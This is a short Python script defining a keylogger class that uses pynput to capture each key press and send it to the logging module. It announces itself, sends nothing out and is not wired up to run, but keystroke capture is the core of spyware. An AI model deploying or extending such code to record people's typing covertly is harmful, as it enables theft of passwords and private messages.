#!/usr/bin/python3.11
import logging, sys, os
from pynput.keyboard import Key, Listener

class KeyLogger:
	def __init__(self):
		pass
	
	def on_key_press(self, key):
		''' begin to listen/log when a key is pressed '''
		try:	
			logging.log(20, key.char)
		except:	
			print( 'cannot determine character of key. logging key name instead.' )
			logging.log(20, key.name)
	def listen(self):
		''' 
		    on_key_press is linked to listener. 
		    this way, resources are released when program closes
		'''
		print('listening:\n')
		with Listener( on_press=self.on_key_press ) as listener:
			listener.join()
